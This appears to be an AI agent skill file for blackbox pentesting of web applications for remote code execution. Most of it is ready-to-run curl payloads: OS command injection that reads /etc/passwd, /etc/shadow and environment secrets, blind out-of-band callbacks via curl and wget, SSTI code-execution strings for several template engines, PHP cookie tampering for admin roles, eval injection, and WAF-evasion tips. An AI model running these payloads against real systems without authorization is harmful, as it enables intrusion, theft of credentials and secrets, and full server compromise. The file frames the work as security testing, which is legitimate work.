---
name: blackbox-rce
description: >-
  Actively test a target web application for Remote Code Execution (RCE)
  vulnerabilities using blackbox techniques. Reads pentest/target-map.md,
  injects OS command injection payloads into parameters that process system
  commands, tests for unsafe deserialization via malicious serialized payloads,
  probes eval/template injection vectors, and detects execution via response
  content or out-of-band DNS/HTTP callbacks. Writes confirmed findings with PoC
  curl commands to pentest/rce-results.md. Use when asked to find RCE,
  command injection, or unsafe deserialization in a blackbox pentest.
---

# Blackbox RCE Detection

You are actively testing a web application for Remote Code Execution vulnerabilities without source code access. You will inject OS command payloads, test deserialization, and probe for code injection vectors.

**Prerequisite**: Read `pentest/target-map.md` before starting.

---

## RCE Categories (Blackbox)

1. **OS Command Injection**: Parameter passed to shell; metacharacters execute additional commands
2. **Server-Side Template Injection (SSTI)**: User input inserted into template engine → code execution
3. **Unsafe Deserialization**: Attacker-controlled serialized data deserialized by the server → RCE
4. **eval/exec injection**: User input passed to code evaluation functions

---

## Phase 1: Identify RCE Candidates

Read `pentest/target-map.md` and find parameters likely to be used in commands or template rendering:

**OS Command Injection candidates**:
- Parameters that look like: `host`, `ip`, `domain`, `cmd`, `exec`, `command`, `ping`, `nslookup`, `traceroute`, `convert`, `resize`, `format`
- File processing endpoints (image conversion, document processing, compression)
- Network utility endpoints (ping, traceroute, DNS lookup features)
- Report generation (PDF, CSV export that may call external tools)

**Template injection candidates**:
- Template preview features, email template editors, custom greetings, notification messages
- Any parameter whose value is reflected in a styled/formatted response
- `name`, `subject`, `message`, `template`, `greeting`, `body` fields

**Deserialization candidates**:
- Endpoints accepting `application/x-java-serialized-object` content type
- Cookie values that appear Base64-encoded and non-JWT (check for Java/PHP/Python object headers)
- Parameters named `data`, `object`, `session`, `state` with suspicious encoded values

Write candidates to `pentest/rce-recon.md`.

---

## Phase 2: OS Command Injection Testing

### Test 1: Basic Command Chaining

For each RCE candidate parameter, inject command separators:

```bash
# Semicolon separator
curl -sk "<TARGET_URL>/ping?host=127.0.0.1;id"
curl -sk "<TARGET_URL>/ping?host=127.0.0.1;whoami"

# Pipe separator
curl -sk "<TARGET_URL>/tools?ip=127.0.0.1|id"

# AND separator
curl -sk "<TARGET_URL>/tools?ip=127.0.0.1&&id"

# Subshell
curl -sk "<TARGET_URL>/tools?ip=127.0.0.1\$(id)"

# Backtick
curl -sk "<TARGET_URL>/tools?ip=127.0.0.1\`id\`"

# Newline injection
curl -sk "<TARGET_URL>/tools?ip=127.0.0.1%0aid"
```

**Confirmed command injection** if the response contains:
- `uid=0(root)` or `uid=N(username)` — output of `id`
- `/bin/bash` or `/usr/bin` — from `which bash` or path enumeration
- Hostname, user list, file contents

### Test 2: Blind Command Injection (Time-Based)

If output is not reflected, use time-based detection:

```bash
# Linux sleep
time curl -sk "<TARGET_URL>/ping?host=127.0.0.1;sleep 5"
time curl -sk "<TARGET_URL>/ping?host=127.0.0.1%3Bsleep+5"

# Windows ping loop (5 second delay)
time curl -sk "<TARGET_URL>/ping?host=127.0.0.1^&ping -n 5 127.0.0.1"
```

**Confirmed** if consistent ~5 second delay (run twice to rule out network).

### Test 3: Blind Command Injection (Out-of-Band)

Use an OOB callback to confirm execution:

```bash
# Replace with your webhook.site or interactsh URL
OOB_URL="http://abc123.oast.me"

# DNS lookup (blind OOB)
curl -sk "<TARGET_URL>/ping?host=\$(nslookup+$OOB_URL)"
curl -sk "<TARGET_URL>/ping?host=127.0.0.1;curl+$OOB_URL"
curl -sk "<TARGET_URL>/ping?host=127.0.0.1;wget+-q+$OOB_URL"

# PowerShell (Windows)
curl -sk "<TARGET_URL>/ping?host=127.0.0.1%26Invoke-WebRequest+$OOB_URL"
```

**Confirmed blind RCE** if your OOB server receives a request.

### Test 4: Full Command Execution (if confirmed)

Once injection is confirmed, demonstrate impact:

```bash
# Read sensitive files
curl -sk "<TARGET_URL>/ping?host=127.0.0.1;cat+/etc/passwd"
curl -sk "<TARGET_URL>/ping?host=127.0.0.1;cat+/etc/shadow"
curl -sk "<TARGET_URL>/ping?host=127.0.0.1;env"

# System information
curl -sk "<TARGET_URL>/ping?host=127.0.0.1;uname+-a"
curl -sk "<TARGET_URL>/ping?host=127.0.0.1;id;hostname;whoami"
```

---

## Phase 3: Server-Side Template Injection (SSTI)

### Test 1: Math Expression Probes

Inject mathematical expressions that template engines evaluate:

```bash
# Jinja2/Twig/Smarty/Pebble detection: {{7*7}} → 49
curl -sk "<TARGET_URL>/greet?name={{7*7}}"
curl -sk -X POST "<TARGET_URL>/api/preview" \
  -d "template={{7*7}}"

# FreeMarker: ${7*7} → 49
curl -sk "<TARGET_URL>/email?subject=\${7*7}"

# Velocity: #set($x=7*7)${x} → 49
curl -sk "<TARGET_URL>/template?msg=%23set(%24x%3D7*7)%24%7Bx%7D"

# ERB (Ruby): <%= 7*7 %> → 49
curl -sk "<TARGET_URL>/render?view=%3C%25%3D+7*7+%25%3E"

# Twig: {{7*'7'}} → 49 (Twig) or "7777777" (Jinja2)
curl -sk "<TARGET_URL>/message?content={{7*'7'}}"
```

**Confirmed SSTI** if the response shows `49` where you injected the expression.

### Test 2: RCE via SSTI (if math probe succeeds)

```bash
# Jinja2 RCE
curl -sk "<TARGET_URL>/greet?name={{config.__class__.__init__.__globals__['os'].popen('id').read()}}"

# Simplified Jinja2
curl -sk "<TARGET_URL>/greet?name={{''.__class__.__mro__[1].__subclasses__()[396]('id',shell=True,stdout=-1).communicate()[0].strip()}}"

# FreeMarker RCE
curl -sk "<TARGET_URL>/template?msg=\${'freemarker.template.utility.Execute'?new()('id')}"

# ERB RCE
curl -sk "<TARGET_URL>/render?view=%3C%25%3D+%60id%60+%25%3E"

# Twig RCE
curl -sk "<TARGET_URL>/preview?tmpl={{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}"

# Velocity RCE
curl -sk "<TARGET_URL>/notify?msg=%23set(%24e%3D%22%22)%23set(%24x%3D%24e.class.forName(%22java.lang.Runtime%22))%23set(%24rt%3D%24x.getMethod(%22getRuntime%22).invoke(%24x))%23set(%24cmd%3D%24rt.exec(%22id%22))%23set(%24stream%3D%24cmd.getInputStream)%23set(%24iter%3D%24stream.iterator)%23foreach(%24l+in+%24iter)%24l%23end"
```

---

## Phase 4: Unsafe Deserialization Detection

### Test 1: Identify Deserialization Endpoints

Check for Java serialization headers in cookies and request bodies:

```bash
# Fetch any cookies with base64-like values
curl -sk -D - "<TARGET_URL>/"

# Decode cookie values
echo -n "<COOKIE_VALUE>" | base64 -d | xxd | head
# Java serialized: starts with  'aced 0005' (hex) = '¬í\x00\x05' (binary)
# PHP serialized: starts with 'a:', 'O:', 's:', 'i:' patterns
# Python pickle: starts with '\x80\x04\x95' or '\x80\x02' hex
```

### Test 2: PHP Object Injection

If cookies or parameters contain PHP serialize format:
```bash
# Current cookie: O:4:"User":1:{s:4:"role";s:4:"user";}  (base64 encoded)
# Modified:       O:4:"User":1:{s:4:"role";s:5:"admin";}
PAYLOAD=$(echo -n 'O:4:"User":1:{s:4:"role";s:5:"admin";}' | base64)

curl -sk "<TARGET_URL>/profile" \
  -H "Cookie: session=$PAYLOAD"
```

### Test 3: Java Deserialization (ysoserial)

If a Java serialized object is detected (aced0005 header):
```bash
# Note: ysoserial requires Java and the target to have vulnerable libraries
# Generate payload for Commons Collections (common in older Java apps)
# java -jar ysoserial.jar CommonsCollections6 'curl http://your-oob.com' | base64

# If you have a pre-generated payload:
curl -sk -X POST "<TARGET_URL>/api/deserialize" \
  -H "Content-Type: application/x-java-serialized-object" \
  --data-binary @payload.bin
```

---

## Phase 5: Code Injection in Other Contexts

### Eval Injection

```bash
# Node.js eval endpoints
curl -sk "<TARGET_URL>/calculate?expr=1+1"
curl -sk "<TARGET_URL>/calculate?expr=process.version"
curl -sk "<TARGET_URL>/calculate?expr=require('child_process').execSync('id').toString()"

# Python eval
curl -sk "<TARGET_URL>/math?formula=1+1"
curl -sk "<TARGET_URL>/math?formula=__import__('os').system('id')"
```

---

## Output Format

Write findings to `pentest/rce-results.md`:

```markdown
# RCE Assessment Results

## Executive Summary
- Parameters tested: [N]
- Confirmed RCE: [N]
- Blind RCE (OOB): [N]
- SSTI Confirmed: [N]
- Not Vulnerable: [N]

## Findings

### [CONFIRMED RCE] /api/convert - filename parameter (OS Command Injection)

- **Endpoint**: `POST /api/convert`
- **Parameter**: `filename` (JSON body)
- **Injection Type**: OS Command Injection (semicolon separator)
- **Impact**: CRITICAL — Full server compromise; arbitrary command execution as the application user
- **Evidence**: `id` command output (`uid=33(www-data) gid=33(www-data)`) appears in HTTP response
- **PoC**:
  ```bash
  # Confirm RCE — execute id command
  curl -sk -X POST "https://target.com/api/convert" \
    -H "Content-Type: application/json" \
    -d '{"filename":"test.jpg;id","format":"png"}'
  # Expected in response: uid=33(www-data) gid=33(www-data) groups=33(www-data)

  # Escalate — read /etc/passwd
  curl -sk -X POST "https://target.com/api/convert" \
    -H "Content-Type: application/json" \
    -d '{"filename":"test.jpg;cat /etc/passwd","format":"png"}'
  ```
- **Remediation**: Never pass user input to OS commands. Use safe library APIs instead of shell wrappers. If unavoidable, use list-form subprocess calls without shell=True.

### [CONFIRMED SSTI] /greet - name parameter (Jinja2 RCE)

- **Endpoint**: `GET /greet?name=<payload>`
- **Parameter**: `name` (query string)
- **Template Engine**: Jinja2 (Python)
- **Impact**: CRITICAL — Full RCE; attacker can execute arbitrary Python code
- **Evidence**: `{{7*7}}` returns `49` in response; `os.popen('id').read()` returns uid string
- **PoC**:
  ```bash
  # Detect SSTI
  curl -sk "https://target.com/greet?name={{7*7}}"
  # Expected response contains: 49

  # Execute id command via Jinja2 SSTI
  curl -sk "https://target.com/greet?name={{config.__class__.__init__.__globals__['os'].popen('id').read()}}"
  # Expected: uid=1000(app) gid=1000(app)
  ```
- **Remediation**: Never use user input as a template string. Pass user data as template variables to a static template.
```

After writing results, delete `pentest/rce-recon.md`.

---

## Important Reminders

- For blind injection, run sleep payloads twice — consistent delays confirm real injection.
- SSTI math probe (`{{7*7}}`) is safe and non-destructive — always test this first.
- Use OOB (out-of-band) confirmation when output is not reflected.
- Do NOT run destructive commands (rm, format, shutdown) — demonstrate impact with `id`, `whoami`, `env`, `cat /etc/passwd` only.
- If WAF is blocking payloads, try URL encoding, space substitution (`${IFS}`, `+`, `%09`), and alternating case.
- Clean up: delete `pentest/rce-recon.md` after writing results.
